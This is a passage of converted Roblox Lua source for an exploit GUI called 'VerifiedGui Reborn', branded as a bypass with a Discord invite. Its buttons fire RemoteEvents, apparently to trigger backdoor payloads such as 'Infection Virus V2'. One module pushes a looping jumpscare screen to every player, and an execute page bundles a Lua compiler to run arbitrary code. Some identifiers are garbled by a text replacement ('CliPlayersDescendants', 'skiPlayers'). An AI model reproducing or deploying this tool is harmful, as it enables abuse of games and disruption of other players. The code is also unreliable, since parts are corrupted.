			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_245)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.LocalScript
local function C_G2L_254()
local script = G2L["254"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_254)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.mrbean admin.RippleClick
local function C_G2L_257()
local script = G2L["257"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_257)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.RippleClick
local function C_G2L_267()
local script = G2L["267"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_267)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Infection Virus V2.LocalScript
local function C_G2L_276()
local script = G2L["276"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_276)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.nothing here yet.RippleClick
local function C_G2L_286()
local script = G2L["286"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_286)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule
G2L_MODULES[G2L["302"]] = {
Closure = function()
local script = G2L["302"]
local module = {}
function module.idk(plr)
	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("p") then
			local epic = script.ScreenGui:Clone()
			epic.Enabled = true
			epic.LocalScript.Enabled = true
			epic.Parent = v.PlayerGui        
		end
	end
end
return module

end
}
--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.LocalScript
local function C_G2L_304()
local script = G2L["304"]
--obama remake thing

local imagelabel = script.Parent.ImageLabel
local TweenS = game:GetService("TweenService")
local sound = script.Parent.Part
local sound2 = script.Parent.Part2

imagelabel.Image = "rbxassetid://3820085"
sound:Play()
wait(1)
local newt = TweenS:Create(imagelabel,TweenInfo.new(2,Enum.EasingStyle.Quint,Enum.EasingDirection.In),{ImageTransparency = 1})
newt:Play()
wait(4.3)
imagelabel.Image = "rbxassetid://1982429798"
wait(2.7)
sound.SoundId = "rbxassetid://131057316"
sound:Play()
wait(2)
local newt = TweenS:Create(imagelabel,TweenInfo.new(1.4,Enum.EasingStyle.Quint,Enum.EasingDirection.In),{ImageTransparency = 0})
newt:Play()
wait(8.1)
sound2.SoundId = "rbxassetid://12847764145"
wait(0.2)
sound2.Looped = true
sound2:Play()
wait(0.6)
sound:Stop()
script.Parent.Loop.Disabled = false
script.Disabled = true
end
task.spawn(C_G2L_304)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.obunga.Script.MainModule.ScreenGui.Loop
local function C_G2L_311()
local script = G2L["311"]
while true do
	script.Parent.ImageLabel.Visible = false
	script.Parent.GlitchedOB.Visible = true
	script.Parent.GLITCHEDSFX:Play()
	wait(0.2)
	script.Parent.ImageLabel.Visible = true
	script.Parent.GlitchedOB.Visible = false
	wait(5.4)
end
end
task.spawn(C_G2L_311)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.doge.RippleClick
local function C_G2L_313()
local script = G2L["313"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_313)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RippleClick
local function C_G2L_324()
local script = G2L["324"]
guiObject = script.Parent
mouse = game.Players.LocalPlayer:GetMouse()

guiObject.MouseButton1Down:connect(function()
	coroutine.resume(coroutine.create(function()
		guiObject.CliPlayersDescendants = true
		local Circle = script:WaitForChild("Circle"):Clone()
		Circle.Parent = guiObject
		local NewX = mouse.X - Circle.AbsolutePosition.X
		local NewY = mouse.Y - Circle.AbsolutePosition.Y
		Circle.Position = UDim2.new(0, NewX, 0, NewY)
		local Size = 0
		if guiObject.AbsoluteSize.X > guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		elseif guiObject.AbsoluteSize.X < guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.Y*1.5
		elseif guiObject.AbsoluteSize.X == guiObject.AbsoluteSize.Y then
			Size = guiObject.AbsoluteSize.X*1.5
		end
		local Time = 0.5
		Circle:TweenSizeAndPosition(UDim2.new(0, Size, 0, Size), UDim2.new(0.5, -Size/2, 0.5, -Size/2), "Out", "Quad", Time, false, nil)
		for i=1,10 do
			Circle.ImageTransparency = Circle.ImageTransparency + 0.01
			wait(Time/10)
		end
		Circle:Destroy()
	end))
end)
end
task.spawn(C_G2L_324)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.LocalScript
local function C_G2L_333()
local script = G2L["333"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_333)


--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Doritos Executor [ OP ].LocalScript
local function C_G2L_373()
local script = G2L["373"]
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.RemoteEvent:FireServer()
end)
end
task.spawn(C_G2L_373)


--verified.Frame.ImageLabel.Next.LocalScript
local function C_G2L_377()
local script = G2L["377"]
script.Parent.MouseButton1Click:connect(function()
	local page1 = script.Parent.Parent.ScrollingCoolThingDonotEditit
	local page2 = script.Parent.Parent["Page 2"]
	local page3 = script.Parent.Parent["Page 3"]
	local tubersguilabel = script.Parent.Parent.Title
	local tubersguilabel2 = script.Parent.Parent.TitleShadow
	if page1.Visible == true then
		page1.Visible = false
		page2.Visible = true
		tubersguilabel.Text = "Page 2"
		tubersguilabel2.Text = "Page 2"
	elseif page2.Visible == true then
		page2.Visible = false
		page3.Visible = true
		tubersguilabel.Text = "Executor"
		tubersguilabel2.Text = "Executor"
	elseif page3.Visible == true then
		page3.Visible = false
		page1.Visible = true
		tubersguilabel.Text = "BYP8SSE4 BY L0CKK1DD! .gg/AcMSRats"
		tubersguilabel2.Text = "VerifiedGui Reborn"
end
end)
end
task.spawn(C_G2L_377)


--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
local function C_G2L_381()
local script = G2L["381"]
script.Parent.MouseButton1Down:connect(function()
	script.Parent.Parent.Parent.Parent.Info.Visible = true
end)
end
task.spawn(C_G2L_381)


--verified.Frame.ImageLabel.Page 2.ImageButton.LocalScript
local function C_G2L_383()
local script = G2L["383"]
script.Parent.MouseButton1Down:connect(function()
	script.Parent.Parent.Parent.Parent.settings.Visible = true
end)
end
task.spawn(C_G2L_383)


--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
local function C_G2L_385()
local script = G2L["385"]
script.Parent.MouseButton1Click:connect(function()
	script.Parent.Parent.Parent.Parent.ImageLabel.Visible = false
	script.Parent.Parent.Parent.Parent.Open.Visible = true
end)
end
task.spawn(C_G2L_385)


--verified.Frame.ImageLabel.Page 2.TextButton.LocalScript
local function C_G2L_387()
local script = G2L["387"]
script.Parent.MouseButton1Click:connect(function()
	script.Parent.Parent.Parent.Parent.Updates.Visible = true
end)
end
task.spawn(C_G2L_387)


--verified.Frame.ImageLabel.Close.LocalScript
local function C_G2L_392()
local script = G2L["392"]
local frame = script.Parent.Parent

script.Parent.MouseButton1Click:Connect(function()
	frame.Visible = false
end)
end
task.spawn(C_G2L_392)


--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring
G2L_MODULES[G2L["397"]] = {
Closure = function()
local script = G2L["397"]
--[[
	Credit to einsteinK.
	Credit to Stravant for LBI.
	
	Credit to the creators of all the other modules used in this.
	
	Sceleratis was here and decided modify some things.
	
	einsteinK was here again to fix a bug in LBI for if-statements
--]]

local waitDePlayers = {
	'LBI';
	'LuaK';
	'LuaP';
	'LuaU';
	'LuaX';
	'LuaY';
	'LuaZ';
}

for i,v in pairs(waitDePlayers) do script:WaitForChild(v) end

local luaX = require(script.LuaX)
local luaY = require(script.LuaY)
local luaZ = require(script.LuaZ)
local luaU = require(script.LuaU)
local lbi = require(script.LBI)

luaX:init()
local LuaState = {}

return function(str,env)
	local f,writer,buff
	local ran,error=pcall(function()
		local zio = luaZ:init(luaZ:make_getS(str), nil)
		if not zio then return error() end
		local func = luaY:parser(LuaState, zio, nil, "@input")
		writer, buff = luaU:make_setS()
		luaU:dump(LuaState, func, writer, buff)
		f = lbi.load_bytecode(buff.data)
		if env then		
			setfenv(f,env)
		else
			local env=getfenv()
			env.script=nil
			setfenv(f,env)
		end
	end)
	if ran then
		return f,buff.data
	else
		return nil,error
	end
end
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaZ
G2L_MODULES[G2L["398"]] = {
Closure = function()
local script = G2L["398"]
--[[--------------------------------------------------------------------

  lzio.lua
  Lua buffered streams in Lua
  This file is part of Yueliang.

  Copyright (c) 2005-2006 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- Notes:
-- * EOZ is implemented as a string, "EOZ"
-- * Format of z structure (ZIO)
--     z.n       -- bytes still unread
--     z.p       -- last read position position in buffer
--     z.reader  -- chunk reader function
--     z.data    -- additional data
-- * Current position, p, is now last read index instead of a pointer
--
-- Not implemented:
-- * luaZ_lookahead: used only in lapi.c:lua_load to detect binary chunk
-- * luaZ_read: used only in lundump.c:ezread to read +1 bytes
-- * luaZ_openspace: dropped; let Lua handle buffers as strings (used in
--   lundump.c:LoadString & lvm.c:luaV_concat)
-- * luaZ buffer macros: dropped; buffers are handled as strings
-- * lauxlib.c:getF reader implementation has an extraline flag to
--   skip over a shbang (#!) line, this is not implemented here
--
-- Added:
-- (both of the following are vaguely adapted from lauxlib.c)
-- * luaZ:make_getS: create Reader from a string
-- * luaZ:make_getF: create Reader that reads from a file
--
-- Changed in 5.1.x:
-- * Chunkreader renamed to Reader (ditto with Chunkwriter)
-- * Zio struct: no more name string, added Lua state for reader
--   (however, Yueliang readers do not require a Lua state)
----------------------------------------------------------------------]]

local luaZ = {}

------------------------------------------------------------------------
-- * reader() should return a string, or nil if nothing else to parse.
--   Additional data can be set only during stream initialization
-- * Readers are handled in lauxlib.c, see luaL_load(file|buffer|string)
-- * LUAL_BUFFERSIZE=BUFSIZ=512 in make_getF() (located in luaconf.h)
-- * Original Reader typedef:
--   const char * (*lua_Reader) (lua_State *L, void *ud, size_t *sz);
-- * This Lua chunk reader implementation:
--   returns string or nil, no arguments to function
------------------------------------------------------------------------

------------------------------------------------------------------------
-- create a chunk reader from a source string
------------------------------------------------------------------------
function luaZ:make_getS(buff)
  local b = buff
  return function() -- chunk reader anonymous function here
    if not b then return nil end
    local data = b
    b = nil
    return data
  end
end

------------------------------------------------------------------------
-- create a chunk reader from a source file
------------------------------------------------------------------------
--[[
function luaZ:make_getF(filename)
  local LUAL_BUFFERSIZE = 512
  local h = io.open(filename, "r")
  if not h then return nil end
  return function() -- chunk reader anonymous function here
    if not h or io.type(h) == "closed file" then return nil end
    local buff = h:read(LUAL_BUFFERSIZE)
    if not buff then h:close(); h = nil end
    return buff
  end
end
--]]
------------------------------------------------------------------------
-- creates a zio input stream
-- returns the ZIO structure, z
------------------------------------------------------------------------
function luaZ:init(reader, data, name)
  if not reader then return end
  local z = {}
  z.reader = reader
  z.data = data or ""
  z.name = name
  -- set up additional data for reading
  if not data or data == "" then z.n = 0 else z.n = #data end
  z.p = 0
  return z
end

------------------------------------------------------------------------
-- fill up input buffer
------------------------------------------------------------------------
function luaZ:fill(z)
  local buff = z.reader()
  z.data = buff
  if not buff or buff == "" then return "EOZ" end
  z.n, z.p = #buff - 1, 1
  return string.sub(buff, 1, 1)
end

------------------------------------------------------------------------
-- get next character from the input stream
-- * local n, p are used to optimize code generation
------------------------------------------------------------------------
function luaZ:zgetc(z)
  local n, p = z.n, z.p + 1
  if n > 0 then
    z.n, z.p = n - 1, p
    return string.sub(z.data, p, p)
  else
    return self:fill(z)
  end
end

return luaZ
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaX
G2L_MODULES[G2L["399"]] = {
Closure = function()
local script = G2L["399"]
--[[--------------------------------------------------------------------

  llex.lua
  Lua lexical analyzer in Lua
  This file is part of Yueliang.

  Copyright (c) 2005-2006 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- Notes:
-- * intended to 'imitate' llex.c code; performance is not a concern
-- * tokens are strings; code structure largely retained
-- * deleted stuff (compared to llex.c) are noted, comments retained
-- * nextc() returns the currently read character to simplify coding
--   here; next() in llex.c does not return anything
-- * compatibility code is marked with "--#" comments
--
-- Added:
-- * luaX:chunkid (function luaO_chunkid from lobject.c)
-- * luaX:str2d (function luaO_str2d from lobject.c)
-- * luaX.LUA_QS used in luaX:lexerror (from luaconf.h)
-- * luaX.LUA_COMPAT_LSTR in luaX:read_long_string (from luaconf.h)
-- * luaX.MAX_INT used in luaX:inclinenumber (from llimits.h)
--
-- To use the lexer:
-- (1) luaX:init() to initialize the lexer
-- (2) luaX:setinput() to set the input stream to lex
-- (3) call luaX:next() or luaX:luaX:lookahead() to get tokens,
--     until "TK_EOS": luaX:next()
-- * since EOZ is returned as a string, be careful when regexp testing
--
-- Not implemented:
-- * luaX_newstring: not required by this Lua implementation
-- * buffer MAX_SIZET size limit (from llimits.h) test not implemented
--   in the interest of performance
-- * locale-aware number handling is largely redundant as Lua's
--   tonumber() function is already capable of this
--
-- Changed in 5.1.x:
-- * TK_NAME token order moved down
-- * string representation for TK_NAME, TK_NUMBER, TK_STRING changed
-- * token struct renamed to lower case (LS -> ls)
-- * LexState struct: removed nestlevel, added decpoint
-- * error message functions have been greatly simplified
-- * token2string renamed to luaX_tokens, exposed in llex.h
-- * lexer now handles all kinds of newlines, including CRLF
-- * shbang first line handling removed from luaX:setinput;
--   it is now done in lauxlib.c (luaL_loadfile)
-- * next(ls) macro renamed to nextc(ls) due to new luaX_next function
-- * EXTRABUFF and MAXNOCHECK removed due to lexer changes
-- * checkbuffer(ls, len) macro deleted
-- * luaX:read_numeral now has 3 support functions: luaX:trydecpoint,
--   luaX:buffreplace and (luaO_str2d from lobject.c) luaX:str2d
-- * luaX:read_numeral is now more promiscuous in slurping characters;
--   hexadecimal numbers was added, locale-aware decimal points too
-- * luaX:skip_sep is new; used by luaX:read_long_string
-- * luaX:read_long_string handles new-style long blocks, with some
--   optional compatibility code
-- * luaX:llex: parts changed to support new-style long blocks
-- * luaX:llex: readname functionality has been folded in
-- * luaX:llex: removed test for control characters
--
--------------------------------------------------------------------]]

local luaZ = require(script.Parent.LuaZ)

local luaX = {}

-- FIRST_RESERVED is not required as tokens are manipulated as strings
-- TOKEN_LEN deleted; maximum length of a reserved word not needed

------------------------------------------------------------------------
-- "ORDER RESERVED" deleted; enumeration in one place: luaX.RESERVED
------------------------------------------------------------------------

-- terminal symbols denoted by reserved words: TK_AND to TK_WHILE
-- other terminal symbols: TK_NAME to TK_EOS
luaX.RESERVED = [[
TK_AND and
TK_BREAK break
TK_DO do
TK_ELSE else
TK_ELSEIF elseif
TK_END end
TK_FALSE false
TK_FOR for
TK_FUNCTION function
TK_IF if
TK_IN in
TK_LOCAL local
TK_NIL nil
TK_NOT not
TK_OR or
TK_REPEAT repeat
TK_RETURN return
TK_THEN then
TK_TRUE true
TK_UNTIL until
TK_WHILE while
TK_CONCAT ..
TK_DOTS ...
TK_EQ ==
TK_GE >=
TK_LE <=
TK_NE ~=
TK_NAME <name>
TK_NUMBER <number>
TK_STRING <string>
TK_EOS <eof>]]

-- NUM_RESERVED is not required; number of reserved words

--[[--------------------------------------------------------------------
-- Instead of passing seminfo, the Token struct (e.g. ls.t) is passed
-- so that lexer functions can use its table element, ls.t.seminfo
--
-- SemInfo (struct no longer needed, a mixed-type value is used)
--
-- Token (struct of ls.t and ls.lookahead):
--   token  -- token symbol
--   seminfo  -- semantics information
--
-- LexState (struct of ls; ls is initialized by luaX:setinput):
--   current  -- current character (charint)
--   linenumber  -- input line counter
--   lastline  -- line of last token 'consumed'
--   t  -- current token (table: struct Token)
--   lookahead  -- look ahead token (table: struct Token)
--   fs  -- 'FuncState' is private to the parser
--   L -- LuaState
--   z  -- input stream
--   buff  -- buffer for tokens
--   source  -- current source name
--   decpoint -- locale decimal point
--   nestlevel  -- level of nested non-terminals
----------------------------------------------------------------------]]

-- luaX.tokens (was luaX_tokens) is now a hash; see luaX:init

luaX.MAXSRC = 80
luaX.MAX_INT = 2147483645       -- constants from elsewhere (see above)
luaX.LUA_QS = "'%s'"
luaX.LUA_COMPAT_LSTR = 1
--luaX.MAX_SIZET = 4294967293

------------------------------------------------------------------------
-- initialize lexer
-- * original luaX_init has code to create and register token strings
-- * luaX.tokens: TK_* -> token
-- * luaX.enums:  token -> TK_* (used in luaX:llex)
------------------------------------------------------------------------
function luaX:init()
  local tokens, enums = {}, {}
  for v in string.gmatch(self.RESERVED, "[^\n]+") do
    local _, _, tok, str = string.find(v, "(%S+)%s+(%S+)")
    tokens[tok] = str
    enums[str] = tok
  end
  self.tokens = tokens
  self.enums = enums
end

------------------------------------------------------------------------
-- returns a suitably-formatted chunk name or id
-- * from lobject.c, used in llex.c and ldebug.c
-- * the result, out, is returned (was first argument)
------------------------------------------------------------------------
function luaX:chunkid(source, bufflen)
  local out
  local first = string.sub(source, 1, 1)
  if first == "=" then
    out = string.sub(source, 2, bufflen)  -- remove first char
  else  -- out = "source", or "...source"
    if first == "@" then
      source = string.sub(source, 2)  -- skip the '@'
      bufflen = bufflen - #" '...' "
      local l = #source
      out = ""
      if l > bufflen then
        source = string.sub(source, 1 + l - bufflen)  -- get last part of file name
        out = out.."..."
      end
      out = out..source
    else  -- out = [string "string"]
      local len = string.find(source, "[\n\r]")  -- stop at first newline
      len = len and (len - 1) or #source
      bufflen = bufflen - #(" [string \"...\"] ")
      if len > bufflen then len = bufflen end
      out = "[string \""
      if len < #source then  -- must truncate?
        out = out..string.sub(source, 1, len).."..."
      else
        out = out..source
      end
      out = out.."\"]"
    end
  end
  return out
end

--[[--------------------------------------------------------------------
-- Support functions for lexer
-- * all lexer errors eventually reaches lexerror:
     syntaxerror -> lexerror
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- look up token and return keyword if found (also called by parser)
------------------------------------------------------------------------
function luaX:token2str(ls, token)
  if string.sub(token, 1, 3) ~= "TK_" then
    if string.find(token, "%c") then
      return string.format("char(%d)", string.byte(token))
    end
    return token
  else
  end
    return self.tokens[token]
end

------------------------------------------------------------------------
-- throws a lexer error
-- * txtToken has been made local to luaX:lexerror
-- * can't communicate LUA_ERRSYNTAX, so it is unimplemented
------------------------------------------------------------------------
function luaX:lexerror(ls, msg, token)
  local function txtToken(ls, token)
    if token == "TK_NAME" or
       token == "TK_STRING" or
       token == "TK_NUMBER" then
      return ls.buff
    else
      return self:token2str(ls, token)
    end
  end
  local buff = self:chunkid(ls.source, self.MAXSRC)
  local msg = string.format("%s:%d: %s", buff, ls.linenumber, msg)
  if token then
    msg = string.format("%s near "..self.LUA_QS, msg, txtToken(ls, token))
  end
  -- luaD_throw(ls->L, LUA_ERRSYNTAX)
  error(msg)
end

------------------------------------------------------------------------
-- throws a syntax error (mainly called by parser)
-- * ls.t.token has to be set by the function calling luaX:llex
--   (see luaX:next and luaX:lookahead elsewhere in this file)
------------------------------------------------------------------------
function luaX:syntaxerror(ls, msg)
  self:lexerror(ls, msg, ls.t.token)
end

------------------------------------------------------------------------
-- move on to next line
------------------------------------------------------------------------
function luaX:currIsNewline(ls)
  return ls.current == "\n" or ls.current == "\r"
end

function luaX:inclinenumber(ls)
  local old = ls.current
  -- lua_assert(currIsNewline(ls))
  self:nextc(ls)  -- skip '\n' or '\r'
  if self:currIsNewline(ls) and ls.current ~= old then
    self:nextc(ls)  -- skip '\n\r' or '\r\n'
  end
  ls.linenumber = ls.linenumber + 1
  if ls.linenumber >= self.MAX_INT then
    self:syntaxerror(ls, "chunk has too many lines")
  end
end

------------------------------------------------------------------------
-- initializes an input stream for lexing
-- * if ls (the lexer state) is passed as a table, then it is filled in,
--   otherwise it has to be retrieved as a return value
-- * LUA_MINBUFFER not used; buffer handling not required any more
------------------------------------------------------------------------
function luaX:setinput(L, ls, z, source)
  if not ls then ls = {} end  -- create struct
  if not ls.lookahead then ls.lookahead = {} end
  if not ls.t then ls.t = {} end
  ls.decpoint = "."
  ls.L = L
  ls.lookahead.token = "TK_EOS"  -- no look-ahead token
  ls.z = z
  ls.fs = nil
  ls.linenumber = 1
  ls.lastline = 1
  ls.source = source
  self:nextc(ls)  -- read first char
end

--[[--------------------------------------------------------------------
-- LEXICAL ANALYZER
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- checks if current character read is found in the set 'set'
------------------------------------------------------------------------
function luaX:check_next(ls, set)
  if not string.find(set, ls.current, 1, 1) then
    return false
  end
  self:save_and_next(ls)
  return true
end

------------------------------------------------------------------------
-- retrieve next token, checking the lookahead buffer if necessary
-- * note that the macro next(ls) in llex.c is now luaX:nextc
-- * utilized used in lparser.c (various places)
------------------------------------------------------------------------
function luaX:next(ls)
  ls.lastline = ls.linenumber
  if ls.lookahead.token ~= "TK_EOS" then  -- is there a look-ahead token?
    -- this must be copy-by-value
    ls.t.seminfo = ls.lookahead.seminfo  -- use this one
    ls.t.token = ls.lookahead.token
    ls.lookahead.token = "TK_EOS"  -- and discharge it
  else
    ls.t.token = self:llex(ls, ls.t)  -- read next token
  end
end

------------------------------------------------------------------------
-- fill in the lookahead buffer
-- * utilized used in lparser.c:constructor
------------------------------------------------------------------------
function luaX:lookahead(ls)
  -- lua_assert(ls.lookahead.token == "TK_EOS")
  ls.lookahead.token = self:llex(ls, ls.lookahead)
end

------------------------------------------------------------------------
-- gets the next character and returns it
-- * this is the next() macro in llex.c; see notes at the beginning
------------------------------------------------------------------------
function luaX:nextc(ls)
  local c = luaZ:zgetc(ls.z)
  ls.current = c
  return c
end

------------------------------------------------------------------------
-- saves the given character into the token buffer
-- * buffer handling code removed, not used in this implementation
-- * test for maximum token buffer length not used, makes things faster
------------------------------------------------------------------------

function luaX:save(ls, c)
  local buff = ls.buff
  -- if you want to use this, please uncomment luaX.MAX_SIZET further up
  --if #buff > self.MAX_SIZET then
  --  self:lexerror(ls, "lexical element too long")
  --end
  ls.buff = buff..c
end

------------------------------------------------------------------------
-- save current character into token buffer, grabs next character
-- * like luaX:nextc, returns the character read for convenience
------------------------------------------------------------------------
function luaX:save_and_next(ls)
  self:save(ls, ls.current)
  return self:nextc(ls)
end

------------------------------------------------------------------------
-- LUA_NUMBER
-- * luaX:read_numeral is the main lexer function to read a number
-- * luaX:str2d, luaX:buffreplace, luaX:trydecpoint are support functions
------------------------------------------------------------------------

------------------------------------------------------------------------
-- string to number converter (was luaO_str2d from lobject.c)
-- * returns the number, nil if fails (originally returns a boolean)
-- * conversion function originally lua_str2number(s,p), a macro which
--   maPlayers to the strtod() function by default (from luaconf.h)
------------------------------------------------------------------------
function luaX:str2d(s)
  local result = tonumber(s)
  if result then return result end
  -- conversion failed
  if string.lower(string.sub(s, 1, 2)) == "0x" then  -- maybe an hexadecimal constant?
    result = tonumber(s, 16)
    if result then return result end  -- most common case
    -- Was: invalid trailing characters?
    -- In C, this function then skiPlayers over trailing spaces.
    -- true is returned if nothing else is found except for spaces.
    -- If there is still something else, then it returns a false.
    -- All this is not necessary using Lua's tonumber.
  end
  return nil
end

------------------------------------------------------------------------
-- single-character replacement, for locale-aware decimal points
------------------------------------------------------------------------
function luaX:buffreplace(ls, from, to)
  local result, buff = "", ls.buff
  for p = 1, #buff do
    local c = string.sub(buff, p, p)
    if c == from then c = to end
    result = result..c
  end
  ls.buff = result
end

------------------------------------------------------------------------
-- Attempt to convert a number by translating '.' decimal points to
-- the decimal point character used by the current locale. This is not
-- needed in Yueliang as Lua's tonumber() is already locale-aware.
-- Instead, the code is here in case the user implements localeconv().
------------------------------------------------------------------------
function luaX:trydecpoint(ls, Token)
  -- format error: try to update decimal point separator
  local old = ls.decpoint
  -- translate the following to Lua if you implement localeconv():
  -- struct lconv *cv = localeconv();
  -- ls->decpoint = (cv ? cv->decimal_point[0] : '.');
  self:buffreplace(ls, old, ls.decpoint)  -- try updated decimal separator
  local seminfo = self:str2d(ls.buff)
  Token.seminfo = seminfo
  if not seminfo then
    -- format error with correct decimal point: no more options
    self:buffreplace(ls, ls.decpoint, ".")  -- undo change (for error message)
    self:lexerror(ls, "malformed number", "TK_NUMBER")
  end
end

------------------------------------------------------------------------
-- main number conversion function
-- * "^%w$" needed in the scan in order to detect "EOZ"
------------------------------------------------------------------------
function luaX:read_numeral(ls, Token)
  -- lua_assert(string.find(ls.current, "%d"))
  repeat
    self:save_and_next(ls)
  until string.find(ls.current, "%D") and ls.current ~= "."
  if self:check_next(ls, "Ee") then  -- 'E'?
    self:check_next(ls, "+-")  -- optional exponent sign
  end
  while string.find(ls.current, "^%w$") or ls.current == "_" do
    self:save_and_next(ls)
  end
  self:buffreplace(ls, ".", ls.decpoint)  -- follow locale for decimal point
